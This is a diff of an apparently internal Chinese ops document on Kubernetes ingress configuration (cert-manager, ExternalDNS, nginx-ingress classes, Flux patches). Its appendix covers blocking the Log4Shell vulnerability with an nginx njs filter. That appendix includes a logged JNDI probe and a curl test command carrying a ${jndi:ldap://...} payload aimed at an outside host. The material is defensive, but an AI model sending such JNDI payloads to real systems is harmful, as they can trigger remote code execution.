@@ -6,9 +6,7 @@
 
 Cert-manager是一个在Kubernetes 集群中提供证书的控制器。然后它将这些证书请求发送到`Let'sEncrypt` API服务器进行签名。这将生成一个Kubernetes `Secret`形式的签名证书。
 
-接口
-
-Ingress资源自动生成证书时，使用如下注解:
+Ingress资源自动生成证书时，使用如下注解即可
 
 ```yaml
 annotation:
@@ -21,9 +19,42 @@ annotation:
 
 `ExternalDNS`运行在集群中，在AWS DNS中创建DNS记录。根据云提供商的不同例如AWS Route53。它可以监视`Ingress `资源以及带注释的LoadBalancer Service和 自动为相应的endpoint 创建DNS记录的入口控制器通过七层路由，所以它是可能的在本地计算机上配置主机名并将其指向入口控制器服务，这是一个繁琐和复杂的的过程。ExternalDNS自动化此过程。
 
+通过Kustomize变量传递的BASE_DOMAIN被设置为`--domain filter`，这意味着这些实例将只处理这个domain name下的完全限定域名的DNS记录。Service 被ExternalDNS忽略，除非metadata  annatation使用 `external-dns.alpha.kubernetes.io/hostname:` 
+
+Service使用以下注释， Ingress则只需要在host里面命中域名即可
+
+```yaml
+annotation:
+  external-dns.alpha.kubernetes.io/hostname:: <reference-to-hostname>
+```
+
+
+
 #### Nginx-ingress
 
 运行在Kubernets集群内部的容器可以通过Pod to Service通信相互通信。Kubernetes中使用一个入口控制器，以一种简单的方式将集群内的服务公开给集群外的客户端。nginx-ingress是我们使用的入口控制器。每个入口控制器需要一个LoadBalancer服务，该服务将给它一个集群外的ip。流量通过负载均衡器流向集群内部的入口控制器实例，然后流量被第7层路由到正确的pod。
+
+nginx-ingress 可以安装多个，根据我们对不同客户，某些客户在微软云上我们会安装两个nginx-ingress 使用不同的`ingressClassName`  一个是在private dns暴露服务在内网使用， 一个是在public dns暴露服务在公网使用。
+
+而在亚马逊云上，我们只安装了一个nginx-ingress 暴露服务在内网使用，暴露到外网我们是使用了CEP , 这个`ingressClassName`我们设置成`private`
+
+因此，在用户级别只需要添加以下annotation 或者直接使用`spec.ingressClassName`
+
+```yaml
+# 方法一 声明使用哪个ingressClass
+annotations:
+    kubernetes.io/ingress.class: "private"
+# 方法二 声明使用哪个ingressClass
+spec:
+  ingressClassName: private
+```
+
+从安全的角度出发，某些服务是对全世界开放，如下所示。 某些只是对公司网络开放需要设置成公司网段
+
+```yaml
+  annotations:
+    custom.nginx.org/allowed-ips: 0.0.0.0/0
+```
 
 
 
@@ -440,17 +471,116 @@ spec:
 
 ## 用户如何创建ingress
 
-要使用patch..
+要使用patch.. 千万不能直接把各种annotation写死在ingress里面，毕竟我们客户多，每个不同云平台，每朵云架构还不太一样。
 
+让用户先写以下ingress文件
+
+```yaml
+apiVersion: networking.k8s.io/v1
+kind: Ingress
+metadata:
+  name: xx-test
+  annotations:
+    # don't config these annotations here, patch it from tech-service if you need: cluster-issuer, ingress class, external-dns, allowed-ips
+    # only keep your own annotations, example:
+    nginx.ingress.kubernetes.io/cors-allow-origin: "*"
+    nginx.ingress.kubernetes.io/enable-cors: "true"
+    nginx.ingress.kubernetes.io/cors-allow-methods: "PUT, GET, POST, OPTIONS, DELETE, PATCH"
+spec:
+  rules:
+  - host: xx-test.xxx.xx
+    http:
+      paths:
+      - backend:
+          service:
+            name: xx
+            port:
+              number: 8080
+        path: /
+        pathType: ImplementationSpecific
+  tls:
+  - hosts:
+    - xx-test.${BASE_DOMAIN}
+    secretName: xx-test-tls
 ```
 
+
+
+以下是使用了Flux的Kustomization去替换的例子
+
+```yaml
+---
+apiVersion: kustomize.toolkit.fluxcd.io/v1beta1
+kind: Kustomization
+metadata:
+  name: ingress-example
+spec:
+  targetNamespace: xx-platform
+  interval: 5m
+  path: "deploy/flux2/example/ingress/"                            # your kustomization
+  patchesJson6902:
+  - target:
+      group: networking.k8s.io
+      version: v1
+      kind: Ingress
+      name: xx-k8s-ingress-central
+    patch:
+    # 1) add cluster-issuer annotation
+    - op: add
+      path: /metadata/annotations/cert-manager.io~1cluster-issuer
+      value: cluster-issuer-vault-central                            # Difference clusterissuer name according to your requirement
+    # 3) add external-dns annotation
+    - op: add
+      path: /metadata/annotations/external-dns.xx.net~1central      # Difference external-dns annotation name according to your requirement
+      value: true
+  postBuild:
+    substituteFrom:
+      - kind: ConfigMap
+        name: cluster-vars
 ```
 
 
 
 ## 附录1
 
-我们使用kustomize对nginx template进行了以下修改，这是有原因的，前阵子的log4j的漏洞
+我们使用kustomize对nginx template进行了以下修改，这是有原因的，前阵子的log4j的漏洞影响面挺大的，修复那么多组件又不是分分钟就能搞定的事情。那么我们只能从我们入口想想能否从入口拦住，为我们争取多点修复时间。
+
+参考链接来源：
+
+<https://www.nginx.com/blog/mitigating-the-log4j-vulnerability-cve-2021-44228-with-nginx/#Is-NGINX-Affected-by-This-Vulnerability>
+
+<https://github.com/tippexs/nginx-njs-waf-cve2021-44228><https://docs.nginx.com/nginx/admin-guide/dynamic-modules/nginscript/?_ga=2.8607927.34957381.1640258095-846761154.1640258095>
+
+手工步骤：
+
+下载CVE
+
+```bash
+cd /etc/nginx/conf.d
+curl https://raw.githubusercontent.com/tippexs/nginx-njs-waf-cve2021-44228/main/cve.js -o cve.js
+sed 's/let/var/g' cve.js
+sed 's/const/var/g' cve.js
+```
+
+修改nginx.config
+
+```bash
+sed "1 a load_module modules/ngx_http_js_module.so;\n" nginx.conf
+sed "15 a \ js_import cve from conf.d/cve.js;\n js_set \$isJNDI cve.inspect;\n js_set \$bodyScanned cve.postBodyInspect;\n" nginx.conf
+```
+
+修改之后，我们在nginx.config可以看到增加了以下部分
+
+```
+load_module modules/ngx_http_js_module.so;             # add this line  
+
+http {
+    js_import cve from conf.d/cve.js;                   # add this line    
+    js_set $isJNDI cve.inspect;                     `   # add this line
+    js_set $bodyScanned cve.postBodyInspect;            # add this line
+```
+
+接下来我们修改ingress-template如下所示，主要就是加了``if` `( $isJNDI = ``"1"` `) { ``return` `403` `"Not Allow!\n"``; } ``
 
 ```yaml
     - op: replace
@@ -677,7 +807,18 @@ spec:
 
 ```
 
+验证是否拦截生效
 
+从日志查看
 
+```
+2021/12/27 02:14:55 [error] 1200#1200: *12334 js: Found CVE2021-44228 IOC: $%7Bjndi:. Request was blocked! From 192.176.1.86
+192.176.1.86 - - [27/Dec/2021:02:14:55 +0000] "GET /$%7Bjndi:$%7Blower:l%7D$%7Blower:d%7D$%7Blower:a%7D$%7Blower:p%7D://was-log4shell-$%7Bdate:YYYY%7DZF0IyjhuS5ZhlDpYPYIa.w.nessus.org%7D HTTP/1.1" 403 11 "-" [-] "curl/7.29.0" "-"
+```
 
+使用命令验证攻击
+
+```bash
+curl 'https://xx.xx.net:443/checkServicesStatus?test=${jndi:ldap://securityscanner.cyber-risk.upguard.com:443/ZruwmNQPOauH9cPJm0D8612_xyDLae5ZzeNO67Jix5Ht30mj/a}'
+```
 
